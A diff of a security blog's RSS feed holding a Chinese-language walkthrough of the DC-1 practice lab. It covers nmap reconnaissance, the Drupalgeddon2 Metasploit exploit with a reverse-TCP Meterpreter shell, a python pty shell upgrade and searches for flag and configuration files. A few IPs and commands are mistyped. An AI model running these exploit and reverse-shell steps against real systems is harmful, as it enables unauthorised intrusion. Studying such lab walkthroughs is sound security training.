@@ -5,13 +5,13 @@
         <link>https://zlaryy.top</link>
         <description>Web安全 / CTF / AI安全 / 个人学习笔记</description>
         <language>zh-CN</language>
-        <pubDate>Tue, 13 Oct 2026 18:22:43 +0800</pubDate>
-        <lastBuildDate>Tue, 13 Oct 2026 18:22:43 +0800</lastBuildDate>
+        <pubDate>Wed, 14 Oct 2026 19:00:00 +0800</pubDate>
+        <lastBuildDate>Wed, 14 Oct 2026 19:00:00 +0800</lastBuildDate>
         <item>
-            <guid isPermalink="true">https://zlaryy.top/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/</guid>
-            <title></title>
-            <link>https://zlaryy.top/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/</link>
-            <pubDate>Tue, 13 Oct 2026 18:22:43 +0800</pubDate>
+            <guid isPermalink="true">https://zlaryy.top/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/</guid>
+            <title>DC-1靶场日记</title>
+            <link>https://zlaryy.top/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/</link>
+            <pubDate>Wed, 14 Oct 2026 19:00:00 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;dc-1靶场日记&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dc-1靶场日记&#34;&gt;#&lt;/a&gt; DC-1靶场日记&lt;/h1&gt;
 &lt;p&gt;参考文章：&lt;a href=&#34;https://blog.csdn.net/2401_88307848/article/details/152442104&#34;&gt;DC-1靶场搭建及渗透实战 超详细 过程-CSDN博客&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/Lmg66/p/14038071.html&#34;&gt;(Ő∀Ő3)ノ骗你的嘿嘿！&lt;/a&gt;&lt;/p&gt;
@@ -25,14 +25,14 @@
 &lt;p&gt;&lt;code&gt;-l&lt;/code&gt;：是&lt;code&gt;--localnet&lt;/code&gt;的简写，根据所选网卡的IPv4地址和子网掩码，自动确定要扫描的本地网段&lt;/p&gt;
 &lt;p&gt;通过大量的ARP请求，然后就可以根据哪些主机返回了ARP应答，就能快速列出局域网内的存活主机、IP和MAC地址&lt;/p&gt;
 &lt;p&gt;我们可以在开启靶场的虚拟机设置里面找到MAC地址：&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/1.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/1.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;执行完arp请求之后我们可以看到类似如下界面的结果：&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/2.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/2.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;根据对应的MAC地址，我们不难发现靶机IP为&lt;code&gt;192.168.152.129&lt;/code&gt;&lt;/p&gt;
 &lt;h2 id=&#34;nmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nmap&#34;&gt;#&lt;/a&gt; nmap&lt;/h2&gt;
 &lt;p&gt;由于攻击机和靶机处在同一个局域网/子网里面，所以首先我们需要通过&lt;code&gt;ifconfig&lt;/code&gt;命令获取攻击机直接连接的网段，扫描这个网段就可以覆盖靶机最可能出现的范围&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;ifconfig&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/3.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/3.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;我们重点关注&lt;code&gt;eth0&lt;/code&gt;里面的&lt;code&gt;inet&lt;/code&gt;、&lt;code&gt;netmask&lt;/code&gt;、&lt;code&gt;broadcast&lt;/code&gt;三个字段，这里的&lt;code&gt;eth0&lt;/code&gt;是Kali的网络接口，&lt;code&gt;lo&lt;/code&gt;是本机回环接口&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;inet&lt;/code&gt;：Kali自己的IPv4地址&lt;/li&gt;
@@ -41,7 +41,7 @@
 &lt;/ul&gt;
 &lt;p&gt;从图中我们可以得到我的Kali的IP为&lt;code&gt;192.168.152.128&lt;/code&gt;，子网掩码是&lt;code&gt;255.255.255.0&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;IPv4地址一共有32位，分成四组，每组八位，子网掩码决定哪些位属于网络部分，哪些属于主机部分，&lt;code&gt;255.255.255.0&lt;/code&gt;转换为二进制为&lt;code&gt;11111111.11111111.11111111.00000000&lt;/code&gt;，其中1表示网络位，0表示主机位&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/4.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/4.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;​                                                                  &lt;em&gt;该图片由ChatGPT生成&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;因此网络位总共有24位，而主机位总共有8位&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;网络地址&lt;/strong&gt;用于标识一个子网，而不是某一台具体的计算机，我这里的网络地址为&lt;code&gt;192.168.152.0&lt;/code&gt;（因为在&lt;code&gt;/24&lt;/code&gt;这个网段中，当所有的主机位都为0时，得到的就是网络地址）&lt;/p&gt;
@@ -94,7 +94,7 @@
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;广播：假设在VMWare中搭建了如下网络&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/5.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/5.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;现在假设Kali想发送网络数据，有常见的两种情况：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;
@@ -130,13 +130,13 @@
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;nmap -sv 192.168.152.0/24&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;在理解Nmap为什么能利用ARP发现靶机之前，我们先理解ARP为什么需要广播&lt;/p&gt;
 &lt;p&gt;假设VMware虚拟网络中有两台虚拟机&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/6.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/6.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Kali想给DC-1发送数据&lt;code&gt;目标IP：192.168.2144.130&lt;/code&gt;（假设主机位为130），这里存在一个问题是：在常见的以太网局域网中，发送IP数据包时，需要把它封装在以太网帧中，而以太网帧需要填写目标IP的MAC地址，可以简记为IP地址用于标识网络中的设备以及跨网络寻址，MAC地址用于当前以太网链路中传递数据帧&lt;/p&gt;
 &lt;p&gt;但是现在Kali只知道DC-1的IP，却不知道MAC地址，这时候就需要ARP（Address Resolution Protocol地址解析协议），它主要用于在IPv4局域网中解析IP地址对应的MAC地址&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;ARP请求为什么需要广播&lt;/strong&gt;：发送ARP请求时，Kali目前并不知道这个MAC地址，它无法直接向DC-1单播发送以太网帧，常见以太网环境中数据大致是这样封装的：&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/8.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/8.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;因为单播需要知道目标MAC，所以这个ARP请求会通过以太网广播发送：&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/7.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/7.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;广播帧的MAC地址为&lt;code&gt;FF:FF:FF:FF:FF:FF&lt;/code&gt;，该地址表示将帧广播给当前二层广播域内的设备，DC-1发现&lt;code&gt;192.168.214.130&lt;/code&gt;是自己的IP，于是回复，其他设备发现请求的IP不是自己的，通常不回复，因此广播的作用就是让Kali在不知道目标MAC地址的情况下找到拥有指定IPv4地址的设备&lt;/p&gt;
 &lt;p&gt;由于DC-1收到的ARP请求中已经包含Kali的IP地址和MAC地址，所以DC-1知道应该把回复发送给谁，也就不需要再次广播，这个APR回复通常采用单播&lt;/p&gt;
 &lt;p&gt;Nmap所做的事情其实是&lt;strong&gt;针对一个网段中的多个IP地址发送ARP请求，然后根据收到的回复判断哪些地址有主机在使用&lt;/strong&gt;，例如&lt;code&gt;nmap -sn 192.168.152.0/24&lt;/code&gt;，Nmap可能分别发送这样的ARP请求：&lt;/p&gt;
@@ -150,36 +150,36 @@
 &lt;h2 id=&#34;探测目标靶机ip的开放端口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#探测目标靶机ip的开放端口&#34;&gt;#&lt;/a&gt; 探测目标靶机IP的开放端口&lt;/h2&gt;
 &lt;p&gt;还是使用nmap来做探测&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;nmap -sV -p- 192.158.152.129&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/9.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/9.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;-sS：TCP SYN扫描（只检测端口状态）&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;-sV：版本检测（检测端口状态+服务版本）&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;-A：全面扫描（包含版本检测+OS检测+脚本扫描）&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;-p-：扫描全部端口0~65535&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;可以看到80端口是http协议，而我们的虚拟机是NAT模式，那么我们可以使用浏览器访问&lt;/p&gt;
 &lt;h1 id=&#34;网页信息搜集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网页信息搜集&#34;&gt;#&lt;/a&gt; 网页信息搜集&lt;/h1&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/10.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/10.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;通过Wappalyzer插件可以很直观地看到Drupal为CMS，也可以通过whatweb：&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;whatweb -v 192.168.152.129&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;whatweb http://192.168.152.129&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/11.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/11.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h1 id=&#34;攻击drupal&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击drupal&#34;&gt;#&lt;/a&gt; 攻击Drupal&lt;/h1&gt;
 &lt;p&gt;接下来我们可以使用工具metasploit查找漏洞（目前世界上领先的渗透测试工具，也是信息安全与渗透测试领域最大的开源项目之一），它的主要用途包括搜索与选择模块，配置攻击参数，执行漏洞利用，管理会话&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;msfconsole&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;search Drupal&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/12.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/12.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;可以选择等级最高的漏洞模块并且时间最新，也就是图中的2018年的漏洞&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;# 使用漏洞模块编号&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;use 1&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;# 使用漏洞名称&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;use exploit/unix/webapp/drupal_drupalgeddon2&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/13.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/13.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;[*] No payload configured, defaulting to php/meterpreter/reverse_tcp&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;系统提示还没有选择攻击载荷（payload），因此自动选择默认的&lt;code&gt;php/meterpreter/reverse_tcp&lt;/code&gt;（php Meterpreter连接），这是因为Drupal是一个web应用，漏洞执行的是php代码&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;msf exploit(unix/webapp/drupal_drupalgedden2) &gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;成功进入Drupalgeddon2漏洞利用模块（CVE-2018-7600，著名的Drupal远程代码执行漏洞）&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;# 查看需要配置哪些参数&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;show options&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/14.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/14.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;Current Setting&lt;/code&gt;是目前设置的内容，Required表示是否需要设置内容，yes为必须设置，no可以设置也可以不设置&lt;/p&gt;
 &lt;p&gt;重点关注Required（是否为必须）为yes的项：&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;RHOSTS：当前为空，需要设置为目标靶机的IP地址（Current Setting）&lt;/span&gt;&lt;/span&gt;
@@ -197,9 +197,9 @@
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;# 检查是否成功&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;show options&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/15.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/15.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;配置成功之后我们就可以执行&lt;code&gt;run&lt;/code&gt;开始攻击了&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/16.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/16.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;Started reverse TCP handler on 192.168.152.128:4444&lt;/code&gt;：攻击机在本地4444端口开启了监听，等待目标机器主动连接回来（反向shell）&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;Running automatic check ...&lt;/code&gt;：模块正在自动检测目标是否存在漏洞&lt;/li&gt;
@@ -227,25 +227,25 @@
 &lt;li&gt;&lt;code&gt;hashdump&lt;/code&gt;（需要高权限）：尝试抓取系统密码哈希&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;ls / pwd / cd&lt;/code&gt;：浏览目标机器文件系统&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/17.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/17.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;既然刚才提到了&lt;code&gt;shell&lt;/code&gt;才能进入靶机标准命令行，我们现在所处的环境是什么呢？&lt;/p&gt;
 &lt;p&gt;当前所处环境是一个&lt;code&gt;Meterpreter&lt;/code&gt;会话，为Metasploit专门提供的内存后渗透工具（Meterpreter）环境，它是刚才发送过去的Payload（&lt;code&gt;php/meterpreter/reverse_tcp&lt;/code&gt;）在目标机器内存中成功执行后建立的，运行在靶机的内存中（&lt;code&gt;PHP In-Memory&lt;/code&gt;），它没有在硬盘上留下明显的二进制文件，隐蔽性很强，这里我们输入的&lt;code&gt;ls&lt;/code&gt;是Meterpreter自带的命令，而不是Linux，通过Meterpreter的API调用目标系统的底层功能来列出文件&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/18.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/18.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;这样我们就拿到了第一个flag：&lt;code&gt;Every good CMS needs a config file - and so do you.&lt;/code&gt;，提示我们需要找配置文件&lt;/p&gt;
 &lt;p&gt;在许多参考文章中都提到了可以用python pty模块升级为交互式shell（前提是受害机有python和获得一个反向shell），可以变得更加简洁美观：&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/19.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/19.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;接下来我们尝试用&lt;code&gt;find&lt;/code&gt;命令查找文件：&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;# 查找名字里带有flag的文件（这里需要root权限才能查找到其他目录下的文件）&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;find / -name flag*&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;# 查找配置文件&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;find / -name settings.php&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/20.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/20.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;由于CMS的配置文件位置和命名方式都不太一样，所以需要搜索一下，查找Drupal的配置文件位置的配置文件名（&lt;code&gt;sites/default/files&lt;/code&gt;）&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/21.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/21.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;接下来我们使用&lt;code&gt;cat settings.php&lt;/code&gt;查看文件内容&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/13/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/22.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/10/14/DC-1%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/22.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;看到了flag2：&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;/**&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt; *&lt;/span&gt;&lt;/span&gt;
@@ -275,20 +275,20 @@
